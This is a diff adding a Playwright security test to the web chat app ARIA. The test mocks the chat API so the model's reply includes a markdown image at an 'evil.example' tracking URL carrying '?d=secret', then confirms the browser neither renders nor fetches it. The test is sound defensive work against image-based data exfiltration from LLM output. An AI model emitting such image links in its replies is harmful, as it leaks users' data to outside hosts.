@@ -51,3 +51,19 @@ for (const ui of ['v1', 'v2']) {
     await expect(page.getByText('Margins are down')).toBeVisible()
   })
 }
+
+// SEC-01: a model-written remote image must not be fetched by the browser.
+test('markdown images are not rendered', async ({ page }) => {
+  await page.addInitScript(() => { for (const n of ['SpeechRecognition', 'webkitSpeechRecognition']) Object.defineProperty(window, n, { value: undefined }); localStorage.setItem('aria_owner_id', 'img-' + Date.now()); localStorage.setItem('aria_version', 'v2') })
+  const fetched: string[] = []
+  await page.route('https://evil.example/**', (route) => { fetched.push(route.request().url()); return route.abort() })
+  await page.route('**/api/chat', (route) => route.request().method() === 'POST' ? route.fulfill({ json: { domain: 'general', query: 'x', response: 'Here is the answer.\n\n![tracking](https://evil.example/pixel.png?d=secret)' } }) : route.continue())
+  await page.goto('/')
+  await page.getByRole('button', { name: 'Leave meeting' }).click({ timeout: 8000 }).catch(() => {})
+  await page.getByLabel('Message ARIA').fill('x')
+  await page.getByLabel('Message ARIA').press('Enter')
+  await expect(page.getByText('Here is the answer.')).toBeVisible()
+  await page.waitForTimeout(500)
+  expect(await page.locator('img[src*="evil.example"]').count()).toBe(0)
+  expect(fetched).toEqual([])
+})
